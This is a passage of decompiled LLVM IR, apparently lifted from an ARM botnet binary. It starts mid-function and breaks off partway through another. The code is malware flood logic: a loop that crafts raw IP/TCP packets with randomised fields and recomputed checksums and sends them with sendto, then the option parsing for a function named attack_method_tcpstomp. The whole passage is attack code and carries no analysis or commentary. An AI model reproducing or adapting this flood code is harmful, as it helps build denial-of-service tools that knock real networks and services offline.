  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v5_afec, { 1, 0 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 3, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
